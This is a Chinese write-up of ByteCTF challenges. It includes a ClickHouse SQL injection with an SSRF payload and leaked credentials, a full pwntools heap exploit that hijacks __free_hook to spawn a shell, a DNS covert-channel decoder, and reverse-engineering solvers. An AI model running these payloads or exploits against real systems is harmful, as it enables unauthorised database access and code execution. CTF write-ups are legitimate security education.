# ByteCTF-WriteUp

> 原文: https://www.ctfiot.com/954.html
> ID: 954

Web 

double sqli

解题思路
clickhouse的sql，官方文档：https://clickhouse.com/
读取hint：http://39.105.175.150:30001/?id=0 UNION ALL SELECT id from ctf.hint，提示you_dont_have_permissions_to_read_flag。

/files../路由发现了目录穿越，在/var/lib/clickhouse/access/找到.sql文件，可以看到user_01用户名密码。这里，user1权限是高于user2的

阅读文档，我们可以通过 url() 函数构造 ssrf，连接上 clickHouse 的HTTP客户端接口并使用服务器上的 clickHouse_client 来切换到 user_01 用户，并用 user_01 用户的权限来执行查询命令，官方文档如下：
https://clickhouse.com/docs/zh/interfaces/http/
最后 payload

SELECT * FROM URL("http://0.0.0.0:8123/?user=user_01&password=e3b0c44298fc1c149afb&query=select+flag+from+ctf.flag", CsSV, 'column String')

所以请求url：

http://39.105.175.150:30001/?id=0%20OR%20(SELECT%20*%20FROM%20url(%22http%3A%2F%2F0.0.0.0%3A8123%2F%3Fuser%3Duser_01%26password%3De3b0c44298fc1c149afb%26query%3Dselect%2Bflag%2Bfrom%2Bctf.flag%22%2C%20CSV%2C%20%27column%20String%27))--+

即可得到

Misc 

frequently

解题思路
发现dns里存在文本【o.bytedanec.top】和【i.bytedanec.top】
猜测o和i转0和1
通过wireshark导出.csv，
notepad++进行数据处理后

        

编写脚本

str=''
final=''
list=[]
with open('bytedanec_io.txt') as f:
    list.append(f.readlines())
    print(list[0])
    for k in list[0]:
        #print(k)
        if 'o.bytedanec.top' in k:
            str += '0'
        if 'i.bytedanec.top' in k:
            str += '1'
    print(str)
print(len(str))
for m in range(0,len(str)):
    if m == 0:
        final += str[m]
    elif m % 8 == 0:
        final += ' '
        final += str[m]
    else:
        final += str[m]
print(final)
#01010100 01101000 01100101 00100000 01100110 01101001 01110010 01110011 01110100 00100000 01110000 01100001 01110010 01110100 00100000 01101111 01100110 00100000 01100110 01101100 01100001 01100111 00111010 00100000 01000010 01111001 01110100 01100101 01000011 01010100 01000110 01111011 01011110 01011111 01011110 01100101 01101110 01001010 00110000 01111001 00100110 01111001 00110000 01110101 01110010
#Thefirstpartofflag:ByteCTF{^_^enJ0y&y0ur

后半段追踪UDP流

发现可疑字样 得到后半段flag
sse1f_wIth_m1sc^^} 拼接得到
ByteCTF{^^enJ0y&y0urse1f_wIth_m1sc^_^}

HearingNotBelieving

解题思路

根据签到盲猜前半段为ByteCTF{       au看到中间段flag 汉信码，扫不出来，尝试手动还原

RX-SSTV还原了后半段flag

手动还原

       

ByteCTF{m4yB3_U_kn0W_S57V}

 Pwn 

bytezoom

解题思路
先create 在select 在create可以造成uaf，而且select 对dog 和 cat不相冲，所以可以用uaf dog 在用cat申请回来造成类型混淆，然后由于dog的age 位置正好是cat的strings字符串的指针位置，然后利用这个改strings字符串，申请一个unsortbin释放leak libc，然后在用add_age计算偏移改到tcache_entry，改free_hook为system

from pwn import *

context.log_level="debug"

context.update(arch='amd64',os='linux',timeout=1)

if args.Q:
    io=remote("39.105.37.172", 30012)
else:
    io=process("./bytezoom")
libc=ELF("./libc-2.31.so")
sla=lambda a,b:io.sendlineafter(a,b)
def choice(c):
    sla("choice:n",str(c))
def create(c,index,name,age):
    choice(1)
    sla("cat or dog?n",c)
    sla("index:n",str(index))
    sla("name:n",name)
    sla("age:n",str(age))
def show(c,index):
    choice(2)
    sla("cat or dog?n",c)
    sla("index:n",str(index))
def manage():
    choice(3)
    
def select(c,idx):
    manage()
    choice(1)
    sla("dog?n",c)
    sla("index:n",str(idx))
def select2(c,idx):
    manage()
    choice(1)
    sla("dog?n",c)
    sla("index:n",str(idx))
    choice(4)
def change_age(c,index,age):
    select(c,index)
    choice(2)
    sla("dog?n",c)
    sla("addn",str(age))
    choice(4)
def change_age2(c,age):
    choice(3)
    choice(2)
    sla("dog?n",c)
    sla("addn",str(age))
    choice(4)
def change_name(c,index,name):
    select(c,index)
    choice(3)
    sla("dog?n",c)
    sla("name:n",name)
    choice(4)
def change_name2(c,name):
    choice(3)
    choice(3)
    sla("dog?n",c)
    sla("name:n",name)
    choice(4)
def main():
    #pause()
    #gdb.attach(io,"b *0x555555554000"+hex(0x2844))
    create("cat",0,"aaaa",18)
    create("dog",0,"aaaa",18)
    select2("dog",0)
    select2("cat",0)
    create("dog",0,'bbbb',18) #cat --->uaf
    create("cat",1,"aaaa",18) #cat(1)===>dog(0)
    create("cat",2,"a"*0x400,18)
    change_age2("dog",0x848)
    show("cat",1)
    io.recvuntil("name:")
    libc_base_low=u32(io.recv(4))
    change_age2("dog",4)
    show("cat",1)
    io.recvuntil("name:")
    libc_base_high=u32(io.recv(4))
    #log.info("libc_base==>"+hex(libc_base_high))0x7fff
    libc_base=libc_base_high*0x100000000+libc_base_low-0x1ebbe0
    free_hook=libc_base+libc.sym["__free_hook"]
    log.info("libc_base==>"+hex(libc_base))
    #choice(4)
    #change_name2("cat","x00")
    change_age2("dog",-0x153cc)
    select2("cat",1)
    change_name2("cat",p64(free_hook))
    #gdb.attach(io,"b *0x555555554000"+hex(0x2844))
    system=libc_base+libc.sym["system"]
    ogg=libc_base+[0xe6e73,0xe6e76,0xe6e79][2]
    create("dog",10,p64(system)*0x4,9)
    create("dog",9,"/bin/shx00"*0x10,9)
    io.interactive()

if __name__=='__main__':
    main()

 Reverse 

languages binding

解题思路
运行PE文件，得到使用说明。

usage: new_lang.exe binfile

根据题目提示，了解另一个文件是加密过的luac文件，根据luac文件的头部的“19 93 0D 0A 1A 0A”前4字节搜索代码并下断，运行中断后回溯，找到加载加密脚本并解密的地方：sub_501F80。解密过程实现上也就是与0x55异或。然后采用不断运行+断点的方法定位lua引擎执行的位置，略过环境设置、头部检查等函数。最终定位到sub_4FAF00，此为luac字节码运行函数。0x525540处存放47个op的handler表。

再看看解码后的luac文件，文件头明显被改过。       

手头有个luac 5.2的解析模板，就想在此基础上修改luac和模板，希望能解析出代码。修改好头和替换官方5.3的op表后发现op表好像与官方的不一致。于是又开始漫漫的op表恢复过程。 

尝试多次后，想从0x525540处的表着手，因为此表的每个元素的前8字节与op是有关系的。如下图所示

这个表实际对应下面图中的源码 

当然前8字节对于op并不是完全唯一，唯一的就可以确定op，有两个的或更多相同的可以先暂op在表中的位置，再根据解析情况交换即可。最终的解析如下图：

    

‘ad’就是加法功能，’mul’就是乘法功能，check2和check3就是检查18-29位的字符和“ByteCTF{}”的格式，check2算法就是简单的四则算术运算和单字节比较，大概情况如下图：

当时的记录如下：

dict[9:11] = [101,122]
lst = [100,120,133]

1 66
2 121
3 116
4 101
5 67
6 84
7 70
8 123
18 +11 == 106
19 1st[1]+21
20 dict[9] + 8
21 ad 100 22
22 55
23 mul 51 2
24 108+1
25 48
26 100
27 102
28 120
29 125

少了8-17位的校验，看上图中的解析，里面还有个”_”函数，并不在此luac文件中。应该是PE说谎的爱人中注册为全局函数了。输入29字节后，在输入数据处下硬件访问断点，断下后，追到sub_4E8D80函数，其在0x4F5C57附近注册。函数伪代码如下：

就是简单的异或计算。
反解后结果为：ByteCTF{1golcwm6q_ymz7fm0dfx}

 0x6d21 

解题思路

        

主函数非常简单，跟进去，发现一堆的跟我们核心无关的代码，直接略过，很快找到核心位置

        

这里是比较字符串长度，同时这里有进行一些计算，动态调试过程中，因为ida无法查看这种寄存器值，造成了阻碍，就是靠这f5的伪代码，一边调试，一边猜，慢慢还原出了算法，有点像矩阵的乘法，具体没查，毕竟用z3解就完事了

#!/usr/bin/env python
# coding=utf-8
from z3 import *

x = [0x15, 0xd, 0x8, 0x5]
y = [0x3, 0x2, 0x1, 0x1]
result = [0xd2c, 0x00000a3d, 0x000009d9, 0x00000bf2, 0x00000b1c, 0x0000095c, 0x00000a12, 0x00000d1e
    , 0x00000b72, 0x0000093f, 0x00000957, 0x00000bcc, 0x0000055f, 0x00000559, 0x000006da, 0x000009e1]
def getflag():
    s = Solver()
    input = [Int("x%d" % i) for i in range(16)]
    for i in range(4):
        v4 = input[2] * x[i] + input[3] * y[i] + input[0] * y[3-i] + input[1] * x[3-i]
        s.add(v4 == result[i])
        v5 = input[6] * x[i] + input[7] * y[i] + input[4] * y[3-i] + input[5] * x[3-i]
        s.add(v5 == result[4+i])
        v6 = input[10] * x[i] + input[11] * y[i] + input[8] * y[3-i] + input[9] * x[3-i]
        s.add(v6 == result[8+i])
        v7 = input[14] * x[i] + input[15] * y[i] + input[12] * y[3-i] + input[13] * x[3-i]
        s.add(v7 == result[12+i])
    if(s.check() == sat):
        m = s.model()
        flag = [chr(m[input[i]].as_long().real) for i in range(16)]
        print("".join(flag))

getflag()

ByteCTF{matrix_0bf_mba!!}

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
SELECT * FROM URL("http://0.0.0.0:8123/?user=user_01&password=e3b0c44298fc1c149afb&query=select+flag+from+ctf.flag", CsSV, 'column String')
```



```
http://39.105.175.150:30001/?id=0%20OR%20(SELECT%20*%20FROM%20url(%22http%3A%2F%2F0.0.0.0%3A8123%2F%3Fuser%3Duser_01%26password%3De3b0c44298fc1c149afb%26query%3Dselect%2Bflag%2Bfrom%2Bctf.flag%22%2C%20CSV%2C%20%27column%20String%27))--+
```



```
str=''
final=''
list=[]
with open('bytedanec_io.txt') as f:
    list.append(f.readlines())
    print(list[0])
    for k in list[0]:
        #print(k)
        if 'o.bytedanec.top' in k:
            str += '0'
        if 'i.bytedanec.top' in k:
            str += '1'
    print(str)
print(len(str))
for m in range(0,len(str)):
    if m == 0:
        final += str[m]
    elif m % 8 == 0:
        final += ' '
        final += str[m]
    else:
        final += str[m]
print(final)
#01010100 01101000 01100101 00100000 01100110 01101001 01110010 01110011 01110100 00100000 01110000 01100001 01110010 01110100 00100000 01101111 01100110 00100000 01100110 01101100 01100001 01100111 00111010 00100000 01000010 01111001 01110100 01100101 01000011 01010100 01000110 01111011 01011110 01011111 01011110 01100101 01101110 01001010 00110000 01111001 00100110 01111001 00110000 01110101 01110010
#Thefirstpartofflag:ByteCTF{^_^enJ0y&y0ur
```



```
from pwn import *

context.log_level="debug"

context.update(arch='amd64',os='linux',timeout=1)

if args.Q:
    io=remote("39.105.37.172", 30012)
else:
    io=process("./bytezoom")
libc=ELF("./libc-2.31.so")
sla=lambda a,b:io.sendlineafter(a,b)
def choice(c):
    sla("choice:n",str(c))
def create(c,index,name,age):
    choice(1)
    sla("cat or dog?n",c)
    sla("index:n",str(index))
    sla("name:n",name)
    sla("age:n",str(age))
def show(c,index):
    choice(2)
    sla("cat or dog?n",c)
    sla("index:n",str(index))
def manage():
    choice(3)
    
def select(c,idx):
    manage()
    choice(1)
    sla("dog?n",c)
    sla("index:n",str(idx))
def select2(c,idx):
    manage()
    choice(1)
    sla("dog?n",c)
    sla("index:n",str(idx))
    choice(4)
def change_age(c,index,age):
    select(c,index)
    choice(2)
    sla("dog?n",c)
    sla("addn",str(age))
    choice(4)
def change_age2(c,age):
    choice(3)
    choice(2)
    sla("dog?n",c)
    sla("addn",str(age))
    choice(4)
def change_name(c,index,name):
    select(c,index)
    choice(3)
    sla("dog?n",c)
    sla("name:n",name)
    choice(4)
def change_name2(c,name):
    choice(3)
    choice(3)
    sla("dog?n",c)
    sla("name:n",name)
    choice(4)
def main():
    #pause()
    #gdb.attach(io,"b *0x555555554000"+hex(0x2844))
    create("cat",0,"aaaa",18)
    create("dog",0,"aaaa",18)
    select2("dog",0)
    select2("cat",0)
    create("dog",0,'bbbb',18) #cat --->uaf
    create("cat",1,"aaaa",18) #cat(1)===>dog(0)
    create("cat",2,"a"*0x400,18)
    change_age2("dog",0x848)
    show("cat",1)
    io.recvuntil("name:")
    libc_base_low=u32(io.recv(4))
    change_age2("dog",4)
    show("cat",1)
    io.recvuntil("name:")
    libc_base_high=u32(io.recv(4))
    #log.info("libc_base==>"+hex(libc_base_high))0x7fff
    libc_base=libc_base_high*0x100000000+libc_base_low-0x1ebbe0
    free_hook=libc_base+libc.sym["__free_hook"]
    log.info("libc_base==>"+hex(libc_base))
    #choice(4)
    #change_name2("cat","x00")
    change_age2("dog",-0x153cc)
    select2("cat",1)
    change_name2("cat",p64(free_hook))
    #gdb.attach(io,"b *0x555555554000"+hex(0x2844))
    system=libc_base+libc.sym["system"]
    ogg=libc_base+[0xe6e73,0xe6e76,0xe6e79][2]
    create("dog",10,p64(system)*0x4,9)
    create("dog",9,"/bin/shx00"*0x10,9)
    io.interactive()

if __name__=='__main__':
    main()
```



```
dict[9:11] = [101,122]
lst = [100,120,133]

1 66
2 121
3 116
4 101
5 67
6 84
7 70
8 123
18 +11 == 106
19 1st[1]+21
20 dict[9] + 8
21 ad 100 22
22 55
23 mul 51 2
24 108+1
25 48
26 100
27 102
28 120
29 125
```



```
#!/usr/bin/env python
# coding=utf-8
from z3 import *

x = [0x15, 0xd, 0x8, 0x5]
y = [0x3, 0x2, 0x1, 0x1]
result = [0xd2c, 0x00000a3d, 0x000009d9, 0x00000bf2, 0x00000b1c, 0x0000095c, 0x00000a12, 0x00000d1e
    , 0x00000b72, 0x0000093f, 0x00000957, 0x00000bcc, 0x0000055f, 0x00000559, 0x000006da, 0x000009e1]
def getflag():
    s = Solver()
    input = [Int("x%d" % i) for i in range(16)]
    for i in range(4):
        v4 = input[2] * x[i] + input[3] * y[i] + input[0] * y[3-i] + input[1] * x[3-i]
        s.add(v4 == result[i])
        v5 = input[6] * x[i] + input[7] * y[i] + input[4] * y[3-i] + input[5] * x[3-i]
        s.add(v5 == result[4+i])
        v6 = input[10] * x[i] + input[11] * y[i] + input[8] * y[3-i] + input[9] * x[3-i]
        s.add(v6 == result[8+i])
        v7 = input[14] * x[i] + input[15] * y[i] + input[12] * y[3-i] + input[13] * x[3-i]
        s.add(v7 == result[12+i])
    if(s.check() == sat):
        m = s.model()
        flag = [chr(m[input[i]].as_long().real) for i in range(16)]
        print("".join(flag))

getflag()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/beepress0-1634874120.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/beepress5-1634874120.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/beepress8-1634874121.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/beepress6-1634874121.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/beepress10-1634874122.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/beepress8-1634874122.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/beepress5-1634874122.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/beepress5-1634874122-1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/beepress3-1634874122.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/beepress9-1634874123.png)